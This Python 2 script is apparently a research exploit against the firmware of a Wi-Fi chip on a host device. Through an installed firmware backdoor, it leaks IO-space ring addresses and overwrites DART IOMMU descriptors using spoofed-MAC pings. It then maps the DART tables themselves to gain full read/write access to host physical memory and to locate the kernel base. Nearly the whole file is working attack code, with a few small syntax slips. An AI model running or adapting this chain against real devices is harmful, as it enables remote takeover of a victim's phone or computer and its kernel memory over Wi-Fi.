from rrm_exploit.attack import *
from rrm_exploit.conf import *
from scapy.all import *

from defs import *
from conf import *
from primitives import *

import struct

#The last IO-Space address to which we mapped a PA
LAST_MAPPED_IOSPACE_ADDR = MIN_IOSPACE_MAPPING_ADDR

#The last PA we mapped into IO-Space
LAST_MAPPED_PA = None

def get_flow_ring_iospace_addrs():
    '''
    Returns the IO-Space addresses of all the flow rings
    '''

    #Reading the ring information from the PCIe shared structure
    pciedev_shared_t_addr = read_dword(FW_RAM_END - DWORD_SIZE)
    rings_info_ptr        = read_dword(pciedev_shared_t_addr + 12 * DWORD_SIZE)
    ringmem_ptr           = read_dword(rings_info_ptr)

    addrs = []
    for i in range(MIN_FLOW, MAX_FLOW+1):

        #Starting at index 5 since the control rings preceed the flow rings in 
        #the ringmem array. The order is:
        #  0 - H2D Control Submit
        #  1 - H2D RX Post Submit
        #  2 - D2H Control Complete
        #  3 - D2H TX Complete
        #  4 - D2H RX Complete
        #  5 onwards - Flow rings
        ringaddr_ptr = ringmem_ptr + (i+3)*(4*DWORD_SIZE) + 2*DWORD_SIZE
        iospace_addr = read_dword(ringaddr_ptr)
        addrs.append(iospace_addr)

    return addrs

def get_iospace_addrs(dart_offset):
    '''
    Returns the IO-Space addresses matching the given DART offset
    '''
    if dart_offset % FLOW_RING_ITEM_SIZE == 32:
        return {'dart_reg_io' : 0x80609000,
                'l1_table_io' : 0x80681000,
                'l2_table_io' : 0x8069F000}
    elif dart_offset % FLOW_RING_ITEM_SIZE == 16:
        return {'dart_reg_io' : 0x80611000,
                'l1_table_io' : 0x80683000,
                'l2_table_io' : 0x806A1000}
    elif dart_offset % FLOW_RING_ITEM_SIZE == 0:
        return {'dart_reg_io' : 0x80601000,
                'l1_table_io' : 0x80685000,
                'l2_table_io' : 0x806A3000}
    else:
        raise Exception("Illegal DART offset: %08X!" % dart_offset)
    
def leak_ioaddrs_and_create_new_dart_desc():
    '''
    Continuously leaks IO-Space addresses until a new DART descriptor is created.
    '''

    #Continuously leaking IO-Space addresses
    while True:
        
        ensure_backdoor_installed()

        #Sending a single ping to the device to ensure the flow rings are created
        os.system("ping -c 1 %s > /dev/null" % TARGET_IP)
        
        #Retrieving the locations for each of the rings
        ioaddrs = get_flow_ring_iospace_addrs()
        print "[*] Max IO-Space address: %08X" % max(ioaddrs)

        #Did we leak enough addresses?
        if max(ioaddrs) >= LOW_THRESHOLD_IOSPACE_ADDR:
            print "[+] Leaked enough IO-Space addresses, continuing"
            return

        #Speeding up the leak process by deleting as many rings as possible before we crash
        if (LOW_THRESHOLD_IOSPACE_ADDR - max(ioaddrs)) >= MAX_FAST_LEAK_THRESHOLD:
            print "[*] Fast leak mode - deleting as many rings as possible"
            for i in range(3, MAX_FLOW):
                try:
                    delete_ring(i)
                except:
                    break #We may have crashed while deleting, that's fine
        else:
            print "[*] Slow leak mode - deleting target ring"
            delete_ring(TARGET_RING_IDX)
    
        time.sleep(5) #Let the host process the deletion request(s)

        #Rebooting the firmware by sending ICMP requests until the deleted ring is used
        while True:
            os.system("ping -c 1 %s > /dev/null" % TARGET_IP)
            try:
                read_dword(FW_RAM_START)
            except:
                break

def overwrite_dart_desc(target_io, target_pa, dart_offset, spoofed_ip):
    '''
    Continuously attempts to overwrite the DART descriptors with the target spoofed MAC addresses
    '''
    
    #Making sure the backdoor is present
    ensure_backdoor_installed()

    #Reading the addresses of the R/W ring indices (both FW in IO-Space) 
    pciedev_shared_t_addr = read_dword(FW_RAM_END-DWORD_SIZE)
    rings_info_ptr        = read_dword(pciedev_shared_t_addr + 12*DWORD_SIZE)
    h2d_w_idx_ptr    = read_dword(rings_info_ptr + 5*DWORD_SIZE)
    h2d_r_idx_ptr    = read_dword(rings_info_ptr + 7*DWORD_SIZE)
    h2d_w_idx_fw_ptr = read_dword(rings_info_ptr + 1*DWORD_SIZE)
    h2d_r_idx_fw_ptr = read_dword(rings_info_ptr + 2*DWORD_SIZE)

    #Spoofing a ping from the crafted MAC 
    spoofed_mac = ":".join(["%02X" % ord(b) for b in struct.pack("<Q", target_pa | 0x3)[:6]])
    ping(spoofed_mac, TARGET_MAC, spoofed_ip, TARGET_IP, True)
    ping(spoofed_mac, TARGET_MAC, spoofed_ip, TARGET_IP, False, count=5)

    #Calculating the overwrite indices
    dart_idx = (target_io - LOW_THRESHOLD_IOSPACE_ADDR) / DART_GRANULARITY
    total_offset = dart_offset + (dart_idx * QWORD_SIZE)
    if (total_offset % FLOW_RING_ITEM_SIZE) != 8:
        raise Exception("Invalid target IO-Space address! The overwritten descriptor must be at offset 8 in the host_txbuf_post_t structure")

    target_w_idx = total_offset / FLOW_RING_ITEM_SIZE
    target_r_idx = target_w_idx + 2
   
    #DMA-ing the target indices to the host
    double_dma(h2d_r_idx_ptr + TARGET_RING_IDX * DWORD_SIZE, struct.pack("<I", target_r_idx),
               h2d_w_idx_ptr + TARGET_RING_IDX * DWORD_SIZE, struct.pack("<I", target_w_idx),
               1)

    write_dword_fast(h2d_w_idx_fw_ptr + TARGET_RING_IDX * DWORD_SIZE, target_w_idx)
    write_dword_fast(h2d_r_idx_fw_ptr + TARGET_RING_IDX * DWORD_SIZE, target_r_idx)
           
    ping(spoofed_mac, TARGET_MAC, spoofed_ip, TARGET_IP, False, count=5)

    #Waiting for the firmware to reboot
    while True:
        try:
            read_dword(FW_RAM_START)
        except:
            break
    
def find_dart_offset():
    '''
    Scans through each of the possible DART offsets from the flow ring, attempting an overwrite for
    each. After each attempt, the possible target IO-Space probe address is read to gage whether the
    guessed offset is correct. 
    '''

    #Leaking the last ring several times, to enable possible probe destinations in the new descriptor
    print "[*] Leaking flow rings to create probe destinations"
    while True:

        ensure_backdoor_installed()
        ioaddrs = get_flow_ring_iospace_addrs()

        #Have we leaked enough descriptors yet?
        last_ioaddr = ioaddrs[-1]
        if last_ioaddr > LAST_IOSPACE_PROBE_ADDR:
            print "[+] Leaked enough probe destinations"
            break

        #Leaking the last ring again
        delete_ring(MAX_FLOW) 
        while True:
            try:
                read_dword(FW_RAM_START)
            except:
                break
    
    #Probing each of the possible offsets, triggering an overwrite, and seeing if
    #the probe destination now contains the register set we believed would be there
    for dart_offset in range(MIN_DART_OFFSET, MAX_DART_OFFSET+1, DART_SKIP):

        #Calculating the target IO-Space address based on the given offset
        iospace_addrs = get_iospace_addrs(dart_offset)
        target_io = iospace_addrs['dart_reg_io']

        #Trigger the OOB overwrite at this offset
        print "[*] Attempting offset 0x%08X" % dart_offset
        overwrite_dart_desc(target_io, DART_REGISTERS_PA, dart_offset, "192.168.1.18")
        
        #Did we overwrite the probe address?
        ensure_backdoor_installed() 
        val = read_iospace_dword(target_io)
        if val == DART_REG0_VALUE:
            print "[+] Found DART offset: %08X" % dart_offset
            return dart_offset

    return None

def gain_host_rw(dart_offset):
    '''
    Gains host physical memory R/W capabilities by mapping-in DART *itself* into IO-Space
    This allows us to freely add and remove mappings to IO-Space, DMA into them, and therefore
    gain full R/W access to the host's memory.
    '''

    #Getting the pre-calculated IO-Space target addresses corresponding to this DART offset
    iospace_addrs = get_iospace_addrs(dart_offset)

    #Reading DART's L0 descriptor
    l0_desc = read_iospace_dword(iospace_addrs['dart_reg_io'] + DART_L0_DESC_OFFSET)
    print "[*] L0 Descriptor: %08X" % l0_desc

    #Mapping in the L1 table in question
    l1_table_phys = (l0_desc & 0xFFFFFF) << 12
    print "[*] L1 Table PA: %016X" % l1_table_phys
    overwrite_dart_desc(iospace_addrs['l1_table_io'], l1_table_phys, dart_offset, "192.168.1.19")
    ensure_backdoor_installed()

    #Reading the 4th L1 DART descriptor, corresponding to IO-Space ranges [0x80600000-0x80800000)
    l1_desc = read_iospace_qword(iospace_addrs['l1_table_io'] + QWORD_SIZE*3)
    print "[*] L1 Descriptor: %016X" % l1_desc
    
    #Mapping in the L2 table
    l2_table_phys = l1_desc & 0xFFFFFFFFF000
    print "[*] L2 Table PA: %016X" % l2_table_phys
    overwrite_dart_desc(iospace_addrs['l2_table_io'], l2_table_phys, dart_offset, "192.168.1.20")

def dart_map(iospace_addr, host_addr, dart_offset):
    '''
    Maps the given host physical address into the given IO-Space address.
    NOTE: The mappings are only done via the L2 descriptor for the IO-Space
          range [0x80600000-0x80800000), so IO-Space addresses should be 
          within that range.
    '''

    #Simply sanity checks to ensure the IO-Space address is valid
    if (iospace_addr < LOW_THRESHOLD_IOSPACE_ADDR) or (iospace_addr >= HIGH_THRESHOLD_IOSPACE_ADDR):
        raise Exception("Invalid IO-Space address %08X, allowed range (0x%08X-0x%08X)" % (iospace_addr.
                                                                                          LOW_THRESHOLD_IOSPACE_ADDR,
                                                                                          HIGH_THRESHOLD_IOSPACE_ADDR))
    if iospace_addr % DART_GRANULARITY != 0:
        raise Exception("Unaligned IO-Space address: 0x%08X" % iospace_addr)


    #Writing the descriptor into the L2 table
    iospace_addrs = get_iospace_addrs(dart_offset)
    target_io = iospace_addrs['l2_table_io'] + ((iospace_addr - LOW_THRESHOLD_IOSPACE_ADDR) / DART_GRANULARITY * QWORD_SIZE
    desc = struct.pack("<Q", host_addr | 0x3)
    dma_d2h(target_io, desc)

def run_exploit():
    '''
    Runs the entire exploit flow, resulting in full R/W host physical memory control from the Wi-Fi chip
    Returns the DART offset iff the exploit was successful, None otherwise.
    '''
    
    #Leaking descriptors until the flow ring precedes the DART descriptor
    print "[*] Leaking ring descriptors to create new DART L2 Descriptor"
    leak_ioaddrs_and_create_new_dart_desc()
    
    #Finding the offset of DART relative to our flow ring
    print "[*] Searching for DART offset"
    dart_offset = find_dart_offset()
    if not dart_offset:
        print "[-] Failed to find DART offset, aborting."
        return None

    #Gaining host R/W capabilities
    gain_host_rw(dart_offset)
    return dart_offset

def ensure_pa_mapped(pa, dart_offset):
    '''
    Ensures that the given PA is mapped into IO-Space and returns the corresponding 
    IO-Space address to which it is mapped.
    '''
    global LAST_MAPPED_IOSPACE_ADDR
    global LAST_MAPPED_PA

    #Mapping the PA if it wasn't already mapped
    pa_aligned = pa & (~0xFFF)
    if pa_aligned != LAST_MAPPED_PA:
        LAST_MAPPED_IOSPACE_ADDR += DART_GRANULARITY
        if LAST_MAPPED_IOSPACE_ADDR > MAX_IOSPACE_MAPPING_ADDR:
            LAST_MAPPED_IOSPACE_ADDR = MIN_IOSPACE_MAPPING_ADDR
        LAST_MAPPED_PA = pa_aligned 
        dart_map(LAST_MAPPED_IOSPACE_ADDR, pa_aligned, dart_offset)
    
    #Returns the IO-Space address
    return LAST_MAPPED_IOSPACE_ADDR

def read_host_dword(pa, dart_offset):
    '''
    Reads a DWORD from the host's physical address space. To get around DART's large TLB,
    we circularly map PAs into a range of IO-Space addresses. 
    '''

    io = ensure_pa_mapped(pa, dart_offset)
    off = pa & 0xFFF
    junk_val = random.randint(0, 1<<32 - 1)
    write_dword_fast(FW_JUNK_ADDR, junk_val)
    dma_h2d(io + off, FW_JUNK_ADDR, 4)
    while read_dword(FW_JUNK_ADDR) == junk_val:
        pass
    return read_dword(FW_JUNK_ADDR)

def write_host_dword(pa, val, dart_offset):
    '''
    Reads a DWORD from the host's physical address space. To get around DART's large TLB,
    we circularly map PAs into a range of IO-Space addresses. 
    '''

    io = ensure_pa_mapped(pa, dart_offset)
    off = pa & 0xFFF
    dma_d2h(io + off, struct.pack("<I", val))

def find_kernel_base(dart_offset):
    '''
    Finds the kernel's physical base address by reading the KTRR readonly-region registers.
    '''
  
    rorgn_begin_addr = PE_SOC_BASE_PHYS + RORGN_BEGIN_OFFSET
    rorgn_begin = read_host_dword(rorgn_begin_addr, dart_offset)
    kernel_base = (G_PHYS_BASE + (rorgn_begin << 14))
    return kernel_base 

def main():

    #Running the exploit to gain full R/W host physical memory control
    dart_offset = run_exploit()
    if not dart_offset:
        print "[-] Exploit failed."
        return
    ensure_backdoor_installed()
    print "[+] Gained full R/W to physical memory!"

    #Locating the kernel within the PAS
    kernel_base = find_kernel_base(dart_offset)
    print "[+] Kernel Base: 0x%016X" % kernel_base

if __name__ == "__main__":
    main()
